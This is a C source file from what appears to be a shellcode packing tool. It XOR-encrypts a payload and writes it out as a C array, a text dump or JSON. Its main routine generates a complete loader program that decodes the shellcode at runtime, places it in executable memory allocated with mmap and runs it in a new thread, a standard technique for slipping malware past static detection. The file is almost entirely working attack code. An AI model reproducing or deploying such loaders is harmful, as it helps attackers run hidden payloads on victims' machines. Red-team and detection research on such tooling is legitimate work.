#include "xorfuscation.h"
#include "Common.h"
#include <stdio.h>
#include <string.h>

static void write_byte_array(FILE *f, const unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(f, "0x%02x", data[i]);
        if (i + 1 < len) {
            fprintf(f, ", ");
        }
        if ((i + 1) % 16 == 0) {
            fprintf(f, "\n    ");
        }
    }
}

bool generate_xor_output(const char* output_file, const unsigned char* key, size_t key_len) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    FILE *f = g_payload.output_file;

    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <stdlib.h>\n");
    fprintf(f, "#include <string.h>\n");
    fprintf(f, "#include <sys/mman.h>\n");
    fprintf(f, "#include <unistd.h>\n");
    fprintf(f, "#include <pthread.h>\n\n");

    fprintf(f, "unsigned char key[] = {\n    ");
    write_byte_array(f, key, key_len);
    fprintf(f, "\n};\n");
    fprintf(f, "#define KEY_LEN %zu\n", key_len);
    fprintf(f, "#define SHELLCODE_SIZE %zu\n\n", g_payload.final_size);

    fprintf(f, "unsigned char buf[SHELLCODE_SIZE] = {\n    ");
    write_byte_array(f, g_payload.p_new_shell, g_payload.final_size);
    fprintf(f, "\n};\n\n");

    fprintf(f, "int main() {\n");
    fprintf(f, "    unsigned char shellcode[SHELLCODE_SIZE];\n");
    fprintf(f, "    for (size_t i = 0; i < SHELLCODE_SIZE; i++) {\n");
    fprintf(f, "        shellcode[i] = buf[i] ^ key[i %% KEY_LEN];\n");
    fprintf(f, "    }\n");
    fprintf(f, "    void* exec_mem = mmap(NULL, SHELLCODE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n");
    fprintf(f, "    if (exec_mem == MAP_FAILED) { perror(\"mmap failed\"); return -1; }\n");
    fprintf(f, "    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);\n");
    fprintf(f, "    pthread_t t; pthread_create(&t, NULL, (void*(*)(void*))exec_mem, NULL);\n");
    fprintf(f, "    printf(\"[+] Shellcode executed\n\"); getchar();\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");

    fclose(f);
    printf("[+] XOR output written to %s\n", output_file);
    return true;
}

bool generate_xor_text_output(const char* output_file, const unsigned char* key, size_t key_len) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    FILE *f = g_payload.output_file;
    for (size_t i = 0; i < key_len; i++) {
        fprintf(f, "%02x", key[i]);
        if (i + 1 < key_len) fprintf(f, ":");
    }
    fprintf(f, " */\n");
    fprintf(f, "unsigned char shellcode[] = {\n    ");
    write_byte_array(f, g_payload.p_new_shell, g_payload.final_size);
    fprintf(f, "\n};\n");
    fclose(f);
    printf("[+] XOR text output written to %s\n", output_file);
    return true;
}

bool generate_xor_json_output(const char* output_file, const unsigned char* key, size_t key_len) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    FILE *f = g_payload.output_file;
    fprintf(f, "{\n");
    fprintf(f, "  \"type\": \"xor\",\n");
    fprintf(f, "  \"key\": \"");
    for (size_t i = 0; i < key_len; i++) {
        fprintf(f, "%02x", key[i]);
    }
    fprintf(f, "\",\n");
    fprintf(f, "  \"shellcode_size\": %zu,\n", g_payload.final_size);
    fprintf(f, "  \"obfuscated\": [\n    ");
    write_byte_array(f, g_payload.p_new_shell, g_payload.final_size);
    fprintf(f, "\n  ]\n");
    fprintf(f, "}\n");
    fclose(f);
    printf("[+] XOR JSON output written to %s\n", output_file);
    return true;
}
